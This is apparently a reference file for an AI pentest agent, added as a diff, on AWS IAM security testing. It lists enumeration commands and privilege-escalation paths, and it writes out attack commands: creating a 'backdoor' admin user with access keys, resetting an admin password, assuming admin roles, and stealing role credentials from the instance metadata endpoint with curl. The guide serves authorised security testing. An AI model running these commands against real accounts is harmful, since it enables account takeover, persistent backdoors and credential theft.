@@ -1,0 +1,371 @@
+<aws_iam_security_guide>
+<title>AWS IAM SECURITY TESTING</title>
+
+<critical>AWS IAM (Identity and Access Management) controls access to AWS resources. Misconfigurations lead to privilege escalation, lateral movement, and full account compromise. Understanding IAM policies, roles, and trust relationships is essential for identifying escalation paths and unauthorized access.</critical>
+
+<scope>
+- IAM policy misconfigurations
+- Privilege escalation paths
+- Role chaining and assumption
+- Cross-account access exploitation
+- Instance profile abuse
+- Service-linked role exploitation
+- Permission boundaries bypass
+- Credential exposure and theft
+</scope>
+
+<methodology>
+1. Enumerate IAM users, roles, and policies.
+2. Identify overprivileged principals.
+3. Map privilege escalation paths.
+4. Test role assumption and trust relationships.
+5. Analyze service-linked and cross-account roles.
+</methodology>
+
+<enumeration>
+<iam_reconnaissance>
+{% raw %}
+# IAM enumeration commands:
+
+# Current identity:
+aws sts get-caller-identity
+
+# List users:
+aws iam list-users
+
+# List roles:
+aws iam list-roles
+
+# List groups:
+aws iam list-groups
+
+# User details:
+aws iam get-user --user-name username
+aws iam list-user-policies --user-name username
+aws iam list-attached-user-policies --user-name username
+aws iam list-groups-for-user --user-name username
+
+# Role details:
+aws iam get-role --role-name rolename
+aws iam list-role-policies --role-name rolename
+aws iam list-attached-role-policies --role-name rolename
+
+# Policy details:
+aws iam get-policy --policy-arn arn:aws:iam::xxx:policy/name
+aws iam get-policy-version --policy-arn arn --version-id v1
+{% endraw %}
+</iam_reconnaissance>
+
+<policy_analysis>
+{% raw %}
+# Dangerous policy elements:
+
+# Wildcard actions:
+"Action": "*"
+"Action": "iam:*"
+"Action": "ec2:*"
+
+# Wildcard resources:
+"Resource": "*"
+
+# Dangerous conditions:
+"Condition": {}  # No conditions
+
+# Explicit allow:
+"Effect": "Allow"
+
+# High-risk permissions:
+iam:CreateUser
+iam:CreateAccessKey
+iam:AttachUserPolicy
+iam:PutUserPolicy
+iam:CreateRole
+iam:PassRole
+sts:AssumeRole
+{% endraw %}
+</policy_analysis>
+</enumeration>
+
+<privilege_escalation>
+<direct_escalation>
+{% raw %}
+# Direct privilege escalation paths:
+
+# 1. CreateUser + CreateAccessKey:
+aws iam create-user --user-name backdoor
+aws iam create-access-key --user-name backdoor
+aws iam attach-user-policy --user-name backdoor \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# 2. CreateLoginProfile:
+aws iam create-login-profile --user-name admin \
+    --password NewPassword123!
+
+# 3. UpdateLoginProfile:
+aws iam update-login-profile --user-name admin \
+    --password NewPassword123!
+
+# 4. AttachUserPolicy / PutUserPolicy:
+aws iam attach-user-policy --user-name myself \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# 5. CreateAccessKey (for any user):
+aws iam create-access-key --user-name admin
+{% endraw %}
+</direct_escalation>
+
+<role_based_escalation>
+{% raw %}
+# Role-based escalation:
+
+# 1. PassRole + Service exploitation:
+# If can pass role to Lambda/EC2/etc.
+aws lambda create-function \
+    --function-name exploit \
+    --role arn:aws:iam::xxx:role/admin-role \
+    --handler index.handler \
+    --runtime python3.9 \
+    --code S3Bucket=bucket,S3Key=code.zip
+
+# 2. AssumeRole exploitation:
+aws sts assume-role \
+    --role-arn arn:aws:iam::xxx:role/admin-role \
+    --role-session-name exploit
+
+# 3. UpdateAssumeRolePolicy:
+# Modify trust policy to allow self
+aws iam update-assume-role-policy --role-name target-role \
+    --policy-document file://trust-policy.json
+
+# 4. CreateRole with admin trust:
+aws iam create-role --role-name backdoor \
+    --assume-role-policy-document file://trust.json
+aws iam attach-role-policy --role-name backdoor \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+{% endraw %}
+</role_based_escalation>
+
+<service_escalation>
+{% raw %}
+# Service-based escalation:
+
+# 1. Lambda function update:
+# If can update function code:
+aws lambda update-function-code \
+    --function-name existing-function \
+    --zip-file fileb://exploit.zip
+
+# 2. EC2 user data:
+# If can modify instance user data:
+aws ec2 modify-instance-attribute \
+    --instance-id i-xxx \
+    --attribute userData \
+    --value $(base64 -w0 script.sh)
+
+# 3. CloudFormation stack:
+# If can create/update stacks with IAM:
+aws cloudformation create-stack \
+    --stack-name exploit \
+    --template-body file://template.yaml \
+    --capabilities CAPABILITY_IAM
+
+# 4. Glue job:
+# If can create Glue jobs:
+aws glue create-job --name exploit \
+    --role arn:aws:iam::xxx:role/admin-role ...
+{% endraw %}
+</service_escalation>
+</privilege_escalation>
+
+<role_trust>
+<trust_relationship>
+{% raw %}
+# Trust relationship exploitation:
+
+# 1. Overly permissive trust:
+{
+  "Principal": {"AWS": "*"}
+}
+# Any AWS account can assume
+
+# 2. Missing conditions:
+{
+  "Principal": {"AWS": "arn:aws:iam::other-account:root"}
+}
+# No external ID required
+
+# 3. Service trust abuse:
+{
+  "Principal": {"Service": "ec2.amazonaws.com"}
+}
+# Any EC2 in account can assume
+
+# 4. Confused deputy:
+# External account can assume without validation
+{% endraw %}
+</trust_relationship>
+
+<cross_account>
+{% raw %}
+# Cross-account role access:
+
+# 1. Find assumable roles:
+# Check trust policies for external principals
+
+# 2. Assume cross-account role:
+aws sts assume-role \
+    --role-arn arn:aws:iam::target-account:role/name \
+    --role-session-name session
+
+# 3. Resource-based policy abuse:
+# S3, KMS, Lambda may allow cross-account
+{% endraw %}
+</cross_account>
+</role_trust>
+
+<instance_profiles>
+<ec2_metadata>
+{% raw %}
+# Instance profile exploitation:
+
+# 1. SSRF to metadata:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# 2. IMDSv1 vs IMDSv2:
+# v1: Direct access
+# v2: Requires token header
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \
+    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# 3. Credential theft:
+# Role credentials from metadata
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "..."
+}
+{% endraw %}
+</ec2_metadata>
+
+<lambda_environment>
+{% raw %}
+# Lambda credential access:
+
+# Environment variables:
+AWS_ACCESS_KEY_ID
+AWS_SECRET_ACCESS_KEY
+AWS_SESSION_TOKEN
+
+# Lambda assumes its execution role automatically
+# If code execution achieved, use role credentials
+{% endraw %}
+</lambda_environment>
+</instance_profiles>
+
+<permission_boundaries>
+<boundary_bypass>
+{% raw %}
+# Permission boundary bypass:
+
+# 1. Boundary only limits permissions:
+# Not the ability to create roles without boundary
+
+# 2. PassRole without boundary:
+# If can pass roles, may pass unbounded role
+
+# 3. Service-linked roles:
+# Not subject to permission boundaries
+
+# 4. Condition key bypass:
+# Complex conditions may have gaps
+{% endraw %}
+</boundary_bypass>
+</permission_boundaries>
+
+<credential_exposure>
+<credential_theft>
+{% raw %}
+# Credential exposure vectors:
+
+# 1. Environment variables:
+# Lambda, ECS, EC2 user data
+
+# 2. Git repositories:
+# .aws/credentials committed
+
+# 3. CI/CD systems:
+# GitHub Actions, Jenkins secrets
+
+# 4. Logs:
+# CloudWatch, application logs
+
+# 5. Error messages:
+# Stack traces with credentials
+
+# 6. S3 buckets:
+# Backup files with credentials
+{% endraw %}
+</credential_theft>
+</credential_exposure>
+
+<common_payloads>
+{% raw %}
+# Privilege escalation:
+aws iam attach-user-policy --user-name me \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Role assumption:
+aws sts assume-role --role-arn arn:aws:iam::xxx:role/admin
+
+# Credential theft:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Create backdoor user:
+aws iam create-user --user-name backdoor
+aws iam create-access-key --user-name backdoor
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate privilege escalation from limited to admin access.
+2. Show cross-account role assumption without proper controls.
+3. Prove credential theft via metadata or environment.
+4. Document permission boundary bypass.
+5. Provide evidence of overly permissive trust relationships.
+</validation>
+
+<false_positives>
+- Least privilege policies properly scoped
+- Trust relationships with external ID and conditions
+- Permission boundaries consistently applied
+- IMDSv2 enforced
+- Credential rotation and monitoring in place
+</false_positives>
+
+<impact>
+- Full AWS account compromise
+- Data breach across services
+- Resource creation/destruction
+- Cross-account lateral movement
+- Persistent backdoor access
+- Cryptocurrency mining abuse
+</impact>
+
+<pro_tips>
+1. iam:PassRole is the key to many escalation paths.
+2. Check trust relationships for external principal access.
+3. Instance metadata is a goldmine for credentials.
+4. Service-linked roles bypass permission boundaries.
+5. CloudFormation with CAPABILITY_IAM is powerful.
+6. Lambda functions inherit their execution role.
+7. sts:AssumeRole + iam:PassRole = full escalation.
+8. Cross-account roles often lack external ID.
+9. Old access keys may have historical permissions.
+10. Resource-based policies can grant cross-account access.
+</pro_tips>
+
+<remember>IAM misconfigurations are the root cause of most AWS compromises. Focus on privilege escalation paths, especially iam:PassRole and sts:AssumeRole. Trust relationships and instance profiles are common attack vectors. Always map the full escalation path from initial access to administrative control.</remember>
+</aws_iam_security_guide>
